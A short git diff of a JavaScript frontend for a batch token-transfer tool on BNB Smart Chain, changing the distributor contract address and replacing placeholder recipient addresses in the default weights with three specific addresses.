@@ -7,7 +7,7 @@ import QRCode from "qrcode";
 const STORAGE_KEY = "batchtransfer.config.v1";
 const CHAIN_ID = 56;
 const CHAIN_HEX = "0x38";
-const DISTRIBUTOR_ADDRESS = "0x666666C0264E4e56d3D7f28AEd0232705388C1FB";
+const DISTRIBUTOR_ADDRESS = "0x8888c3fbb742fa4e254b7db615f5eb5eb5c877a0";
 
 const erc20Abi = [
   "function approve(address spender, uint256 amount) external returns (bool)",
@@ -26,8 +26,9 @@ const defaultConfig = {
   token: "",
   weights: JSON.stringify(
     {
-      "0x1111111111111111111111111111111111111111": 1000,
-      "0x2222222222222222222222222222222222222222": 2000
+      "0x459080fe44e477aeab9d5947db55df2d6b33a9a3": 1000,
+      "0xd92d818c72adbb88234f5ba4f4c8b4e02b928744": 1000,
+      "0xe4c03fc673c615b3453a757728957f742d5e9a57": 1000
     },
     null,
     2
